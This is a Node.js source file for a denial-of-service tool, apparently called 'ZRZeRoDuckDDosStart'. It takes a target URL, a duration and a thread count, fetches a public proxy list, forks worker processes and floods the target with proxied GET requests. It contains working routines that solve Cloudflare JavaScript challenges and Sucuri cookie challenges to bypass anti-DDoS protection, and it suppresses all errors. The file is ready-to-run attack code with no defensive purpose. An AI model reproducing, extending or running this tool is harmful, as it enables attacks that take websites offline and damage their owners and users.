process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});
var vm = require('vm');
var requestModule = require('request');
var jar = requestModule.jar();
// var fs = require('fs');
var axios = require('axios');
var proxies;
(async ()=>{
    if (process.argv.length != 5){
        console.log(`

╔═╗╔═╗╦═╗╔═╗╔╦╗╦ ╦╔═╗╦╔═
╔═╝║╣ ╠╦╝║ ║ ║║║ ║║  ╠╩╗
╚═╝╚═╝╩╚═╚═╝═╩╝╚═╝╚═╝╩ ╩

Usage : ./ZRZeRoDuckDDosStart <URL> <TIME> <THREADS>
        `);
    } else {
        var res = await axios.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt") 
        proxies = res.data.replace(/\r/g, '').split('\n');
        run();
        console.log("UAMBYPASS [PACKET] been sent to %s for %s seconds", process.argv[2], process.argv[3]);
        setTimeout(function() {
            console.log("DDOS ATTACK ENDED");
            process.exit(0);
        }, process.argv[3] * 1000);
    }
})();

 
function arrremove(arr, what) {
    var found = arr.indexOf(what);
 
    while (found !== -1) {
        arr.splice(found, 1);
        found = arr.indexOf(what);
    }
}
 
var request = requestModule.defaults({
        jar: jar
    }),
    UserAgent = 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
    Timeout = 1000,
    WAF = true,
    cloudscraper = {};
 
 
 
var cookies = [];
 
cloudscraper.get = function(url, callback, headers) {
    performRequest({
        method: 'GET',
        url: url,
        headers: headers
    }, callback);
};
 
cloudscraper.post = function(url, body, callback, headers) {
    var data = '',
        bodyType = Object.prototype.toString.call(body);
 
    if (bodyType === '[object String]') {
        data = body;
    } else if (bodyType === '[object Object]') {
        data = Object.keys(body).map(function(key) {
            return key + '=' + body[key];
        }).join('&');
    }
 
    headers = headers || {};
    headers['Content-Type'] = headers['Content-Type'] || 'application/x-www-form-urlencoded; charset=UTF-8';
    headers['Content-Length'] = headers['Content-Length'] || data.length;
 
    performRequest({
        method: 'POST',
        body: data,
        url: url,
        headers: headers
    }, callback);
}
 
cloudscraper.request = function(options, callback) {
    performRequest(options, callback);
}
 
function performRequest(options, callback) {
    var method;
    options = options || {};
    options.headers = options.headers || {};
 
    options.headers['Cache-Control'] = options.headers['Cache-Control'] || 'private';
    options.headers['Accept'] = options.headers['Accept'] || 'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5';
 
    makeRequest = requestMethod(options.method);
 
    if ('encoding' in options) {
        options.realEncoding = options.encoding;
    } else {
        options.realEncoding = 'utf8';
    }
    options.encoding = null;
 
    if (!options.url || !callback) {
        throw new Error('To perform request, define both url and callback');
    }
 
    options.headers['User-Agent'] = options.headers['User-Agent'] || UserAgent;
 
    makeRequest(options, function(error, response, body) {
        var validationError;
        var stringBody;
 
        if (error || !body || !body.toString) {
            return callback({
                errorType: 0,
                error: error
            }, body, response);
        }
 
        stringBody = body.toString('utf8');
 
        if (validationError = checkForErrors(error, stringBody)) {
            return callback(validationError, body, response);
        }
 
        if (stringBody.indexOf('a = document.getElementById(\'jschl-answer\');') !== -1) {
            setTimeout(function() {
                return solveChallenge(response, stringBody, options, callback);
            }, Timeout);
        } else if (stringBody.indexOf('You are being redirected') !== -1 ||
            stringBody.indexOf('sucuri_cloudproxy_js') !== -1) {
            setCookieAndReload(response, stringBody, options, callback);
        } else {
            processResponseBody(options, error, response, body, callback);
        }
    });
}
 
function checkForErrors(error, body) {
    var match;
 
    if (error) {
        return {
            errorType: 0,
            error: error
        };
    }
 
    if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body)) {
        return {
            errorType: 1
        };
    }
 
    match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);
 
    if (match) {
        return {
            errorType: 2,
            error: parseInt(match[1])
        };
    }
 
    return false;
}
 
 
function solveChallenge(response, body, options, callback) {
    var challenge = body.match(/name="jschl_vc" value="(\w+)"/),
        host = response.request.host,
        makeRequest = requestMethod(options.method),
        jsChlVc,
        answerResponse,
        answerUrl;
 
    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract challengeId (jschl_vc) from page'
        }, body, response);
    }
 
    jsChlVc = challenge[1];
 
    challenge = body.match(/getElementById\('cf-content'\)[\s\S]+?setTimeout.+?\r?\n([\s\S]+?a\.value =.+?)\r?\n/i);
 
    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract method from setTimeOut wrapper'
        }, body, response);
    }
 
    challenge_pass = body.match(/name="pass" value="(.+?)"/)[1];
 
    challenge = challenge[1];
 
    challenge = challenge.replace(/a\.value =(.+?) \+ .+?;/i, '$1');
 
    challenge = challenge.replace(/\s{3,}[a-z](?: = |\.).+/g, '');
    challenge = challenge.replace(/'; \d+'/g, '');
 
    try {
        answerResponse = {
            'jschl_vc': jsChlVc,
            'jschl_answer': (eval(challenge) + response.request.host.length),
            'pass': challenge_pass
        };
    } catch (err) {
        return callback({
            errorType: 3,
            error: 'Error occurred during evaluation: ' + err.message
        }, body, response);
    }
 
    answerUrl = response.request.uri.protocol + '//' + host + '/cdn-cgi/l/chk_jschl';
 
    options.headers['Referer'] = response.request.uri.href;
    options.url = answerUrl;
    options.qs = answerResponse;
 
    makeRequest(options, function(error, response, body) {
 
        if (error) {
            return callback({
                errorType: 0,
                error: error
            }, response, body);
        }
 
        if (response.statusCode === 302) {
            options.url = response.headers.location;
            delete options.qs;
            makeRequest(options, function(error, response, body) {
                processResponseBody(options, error, response, body, callback);
            });
        } else {
            processResponseBody(options, error, response, body, callback);
        }
    });
}
 
function setCookieAndReload(response, body, options, callback) {
    var challenge = body.match(/S='([^']+)'/);
    var makeRequest = requestMethod(options.method);
 
    if (!challenge) {
        return callback({
            errorType: 3,
            error: 'I cant extract cookie generation code from page'
        }, body, response);
    }
 
    var base64EncodedCode = challenge[1];
    var cookieSettingCode = new Buffer(base64EncodedCode, 'base64').toString('ascii');
 
    var sandbox = {
        location: {
            reload: function() {}
        },
        document: {}
    };
    vm.runInNewContext(cookieSettingCode, sandbox);
    try {
        cookies.push(sandbox.document.cookie);
        jar.setCookie(sandbox.document.cookie, response.request.uri.href, {
            ignoreError: true
        });
    } catch (err) {
        return callback({
            errorType: 3,
            error: 'Error occurred during evaluation: ' + err.message
        }, body, response);
    }
 
    makeRequest(options, function(error, response, body) {
        if (error) {
            return callback({
                errorType: 0,
                error: error
            }, response, body);
        }
        processResponseBody(options, error, response, body, callback);
    });
}
 
function requestMethod(method) {
    method = method.toUpperCase();
 
    return method === 'POST' ? request.post : request.get;
}
 
function processResponseBody(options, error, response, body, callback) {
    if (typeof options.realEncoding === 'string') {
        body = body.toString(options.realEncoding);
        if (validationError = checkForErrors(error, body)) {
            return callback(validationError, response, body);
        }
    }
 
 
    callback(error, response, body);
}
 
var ATTACK = {
    cfbypass(method, url, proxy) {
        performRequest({
            method: method,
            proxy: 'http://' + proxy,
            url: url
        }, (err, response, body) => {
            if (response.statusCode != undefined){
                console.log(response.statusCode,response.statusMessage);
            }     // Remove this line if you dont want to see the output of ur request madafaka  
        });
    }
}

function run() {
    const cluster = require('cluster');
    if (cluster.isMaster) {
        for (let i = 0; i < process.argv[4]; i++) {
            cluster.fork();
        }
    
        cluster.on('exit', (worker, code, signal) => {
            console.log(`worker ${worker.process.pid} stop`);
        });
        } else {
            setInterval(() => {
                ATTACK.cfbypass('GET', process.argv[2], proxies[Math.floor(Math.random() * proxies.length)]);
            });
            console.log(`Threads ${process.pid} started`);
        }
}
